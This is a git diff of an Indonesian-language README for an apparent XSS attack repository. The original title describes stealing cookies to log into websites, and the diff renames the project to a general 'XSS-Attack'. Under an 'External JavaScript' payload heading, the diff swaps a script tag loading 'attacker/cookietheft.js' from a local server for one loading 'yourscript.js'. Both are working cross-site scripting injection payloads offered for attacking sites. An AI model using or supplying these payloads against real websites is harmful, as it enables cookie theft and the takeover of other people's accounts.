@@ -1,5 +1,5 @@
-# XSS-CookieTheft
-Maling cookie untuk login ke sebuah website. Sesuaikan dengan Database yang kalian miliki.
+# XSS-Attack
+Penyerangan dengan memanfaatkan Bug XSS pada website.
 
 ## XSS Payload
 ### Basic
@@ -10,5 +10,5 @@ Maling cookie untuk login ke sebuah website. Sesuaikan dengan Database yang kali
 
 ### External JavaScript
 ```
-<script src="http://localhost:8089/attacker/cookietheft.js"></script>
+<script src="http://localhost:8089/yourscript.js"></script>
 ```
